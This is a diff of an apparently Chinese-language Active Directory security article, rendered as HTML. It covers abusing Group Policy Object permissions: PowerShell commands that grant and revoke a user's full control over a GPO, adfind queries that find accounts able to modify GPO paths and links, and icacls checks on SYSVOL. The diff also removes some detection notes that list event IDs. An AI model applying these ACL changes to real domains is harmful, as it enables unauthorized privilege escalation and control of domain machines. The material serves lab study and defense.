+</span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">CN</span><span class="p">=</span><span class="n">Policies</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">test</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;</span><span class="s2">&#34;CR CHILD&#34;</span><span class="p">;;;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#添加用户test1对TestGPO的完全访问权限</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span> <span class="p">=</span> <span class="nv">$RawObject</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-ADObjectAccessControlEntry</span> <span class="n">-InheritanceType</span> <span class="n">All</span> <span class="n">-AccessControlType</span> <span class="n">Allow</span> <span class="n">-PrincipalIdentity</span> <span class="n">test1</span> <span class="n">-Right</span> <span class="n">AccessSystemSecurity</span><span class="p">,</span><span class="n">CreateChild</span><span class="p">,</span><span class="n">Delete</span><span class="p">,</span><span class="n">DeleteChild</span><span class="p">,</span><span class="n">DeleteTree</span><span class="p">,</span><span class="n">ExtendedRight</span><span class="p">,</span><span class="n">GenericAll</span><span class="p">,</span><span class="n">GenericExecute</span><span class="p">,</span><span class="n">GenericRead</span><span class="p">,</span><span class="n">GenericWrite</span><span class="p">,</span><span class="n">ListChildren</span><span class="p">,</span><span class="n">ListObject</span><span class="p">,</span><span class="n">ReadControl</span><span class="p">,</span><span class="n">ReadProperty</span><span class="p">,</span><span class="n">Self</span><span class="p">,</span><span class="n">Synchronize</span><span class="p">,</span><span class="n">WriteDacl</span><span class="p">,</span><span class="n">WriteOwner</span><span class="p">,</span><span class="n">WriteProperty</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div></li>
-<li>
-<p>移除用户test1对TestGPO的完全访问权限</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#移除用户test1对TestGPO的完全访问权限</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span> <span class="p">=</span> <span class="nv">$RawObject</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-ADObjectAccessControlEntry</span> <span class="n">-InheritanceType</span> <span class="n">All</span> <span class="n">-AccessControlType</span> <span class="n">Allow</span> <span class="n">-PrincipalIdentity</span> <span class="n">test1</span> <span class="n">-Right</span> <span class="n">AccessSystemSecurity</span><span class="p">,</span><span class="n">CreateChild</span><span class="p">,</span><span class="n">Delete</span><span class="p">,</span><span class="n">DeleteChild</span><span class="p">,</span><span class="n">DeleteTree</span><span class="p">,</span><span class="n">ExtendedRight</span><span class="p">,</span><span class="n">GenericAll</span><span class="p">,</span><span class="n">GenericExecute</span><span class="p">,</span><span class="n">GenericRead</span><span class="p">,</span><span class="n">GenericWrite</span><span class="p">,</span><span class="n">ListChildren</span><span class="p">,</span><span class="n">ListObject</span><span class="p">,</span><span class="n">ReadControl</span><span class="p">,</span><span class="n">ReadProperty</span><span class="p">,</span><span class="n">Self</span><span class="p">,</span><span class="n">Synchronize</span><span class="p">,</span><span class="n">WriteDacl</span><span class="p">,</span><span class="n">WriteOwner</span><span class="p">,</span><span class="n">WriteProperty</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">RemoveAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div></li>
-</ol>
-<p><strong>攻击检测</strong></p>
-<p>事件5137，4662，5145，4674可以看到组策略的新增信息。</p>
-<h3 id="修改现有的gpo的权限"><a href="#修改现有的gpo的权限" class="anchor-link">#</a><a href="#contents:修改现有的gpo的权限" class="headings">修改现有的GPO的权限</a></h3>
-<p>如果组策略对象的修改或完全控制权限被分配给了某个用户，当该用户被攻击者拿下之后，攻击者利用该用户权限可以修改并配置特定的组策略来渗透攻击受该组策略作用的用户或计算机。</p>
-<ol>
-<li>
-<p><strong>GPC链接到GPT的权限与修改GPT的权限</strong></p>
+</div><p><strong>GPO 链接的权限（可选）</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -502,22 +460,17 @@
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
-</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查找对gPCFileSysPath属性WriteProperty权限的用户</span>
 </span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">CN</span><span class="p">=</span><span class="n">Policies</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">nTSecurityDescriptor</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">subtree</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPCFileSysPath</span><span class="p">;;</span> <span class="n">-recmute</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#修改GPT的权限，由于GPT 是文件夹的形式，并不在LDAP里面，因此使用icacls查看。</span>
+</span></span><span class="line"><span class="cl"><span class="c">#对组策略目录有修改权限的可以随意修改组策略配置</span>
 </span></span><span class="line"><span class="cl"><span class="n">icacls</span> <span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">sysvol</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">scripts</span><span class="p">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">icacls</span> <span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">localsysvol</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">policies</span><span class="p">*</span>
-</span></span><span class="line"><span class="cl"><span class="c">#对目录有修改权限的可以随意修改组策略配置</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div></li>
-<li>
-<p><strong>GPO链接的权限</strong>
-遍历所有的域、站点、OU上的所有ACE，如果有对gPLink属性或者gPOpptions属性的修改权限，就可以修改这个这个域/站点/OU链接的OU。</p>
+</div><p>如果有对域、OU的gPLink属性或gPOpptions属性有修改权限，就可以修改其链接的组策略。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -530,11 +483,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">OU</span><span class="p">=</span><span class="n">客服部</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPOpptions</span><span class="p">;;</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div></li>
-</ol>
-<p><strong>攻击检测</strong></p>
-<p>事件ID5136，4662，5145可以看到GPO的ACL修改。</p>
-<h3 id="seenabledelegationprivilege-特权"><a href="#seenabledelegationprivilege-特权" class="anchor-link">#</a><a href="#contents:seenabledelegationprivilege-特权" class="headings">SeEnableDelegationPrivilege 特权</a></h3>
+</div><h3 id="seenabledelegationprivilege-特权"><a href="#seenabledelegationprivilege-特权" class="anchor-link">#</a><a href="#contents:seenabledelegationprivilege-特权" class="headings">SeEnableDelegationPrivilege 特权</a></h3>
 <p>有SeEnableDelegationPrivilege权限的域用户才能给域内服务账户设置委派（约束和非约束，但不包括基于资源的约束委派）。该权限只能通过Default Domain Controllers Policy组策略修改（或修改域控的计算机策略）。</p>
 <p>并不是拥有一个对象的GenericAll权限，就可以修改对象的msDS-AllowedToDelegateTo属性，只能有SeEnableDelegationPrivilege权限的才行。</p>
 <ol>
